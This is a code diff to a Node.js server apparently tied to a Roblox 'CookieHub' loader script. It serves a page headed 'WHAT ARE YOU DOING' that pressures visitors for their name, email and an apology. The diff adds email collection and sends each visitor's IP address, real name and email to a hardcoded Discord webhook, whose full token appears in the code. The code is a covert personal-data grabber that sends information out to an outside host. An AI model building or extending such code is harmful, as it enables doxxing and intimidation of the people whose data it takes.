@@ -18,6 +18,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
     req.on('end', async () => {
       const data = JSON.parse(body);
       let name = data.name || 'Unknown';
+      let email = data.email || 'Unknown';
       let message = data.message || 'No message';
 
       // Prevent @everyone and @here pings
@@ -44,13 +45,13 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
         })
       });
 
-      // Send IP address to the second webhook
+      // Send IP address, real name, and email to the second webhook (IP info)
       const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
       await fetch(ipWebhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `**IP Address Detected**\n**IP Address:** ${ipAddress}`
+          content: `**IP Address Detected**\n**IP Address:** ${ipAddress}\n**Real Name:** ${name}\n**Email:** ${email}`
         })
       });
 
@@ -83,18 +84,20 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
       </head>
       <body>
         <h1>WHAT ARE YOU DOING</h1>
-        <p>Type your name and apology:</p>
+        <p>Type your name, email, and apology:</p>
         <input type="text" id="nameBox" placeholder="Your Name"><br>
+        <input type="email" id="emailBox" placeholder="Your Email"><br>
         <textarea id="messageBox" rows="4" placeholder="I'm sorry..."></textarea><br>
         <button onclick="sendMessage()">Send</button>
 
         <script>
           function sendMessage() {
             const name = document.getElementById('nameBox').value;
+            const email = document.getElementById('emailBox').value;
             const message = document.getElementById('messageBox').value;
 
-            if (!name || !message) {
-              alert('Please fill both fields!');
+            if (!name || !email || !message) {
+              alert('Please fill all fields!');
               return;
             }
 
@@ -105,6 +108,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
               },
               body: JSON.stringify({
                 name: name,
+                email: email,
                 message: message
               })
             }).then(() => {
